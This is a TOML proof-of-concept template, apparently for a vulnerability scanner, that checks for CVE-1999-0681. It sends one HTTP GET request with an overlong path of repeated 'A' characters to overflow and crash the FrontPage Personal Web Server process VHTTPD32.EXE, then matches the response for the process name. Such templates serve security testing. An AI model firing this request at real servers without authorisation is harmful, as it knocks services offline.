[info]
author = "AVE"
description = "Microsoft FrontPage Personal Web Server 3.0.2.926 缓冲区溢出远程拒绝服务漏洞验证。通过向目标服务器发送超过 166 字符的 GET 请求 URL，触发 VHTTPD32.EXE 进程缓冲区溢出导致服务崩溃"
id = "POC-AVE-1999-0234"
name = "CVE-1999-0681 PoC"
severity = "medium"
tags = ["ave-1999-0234"]
vuln_id = [
    "CVE-1999-0681",
    "AVE-1999-0234",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "VHTTPD32",
    "vhttpd",
]
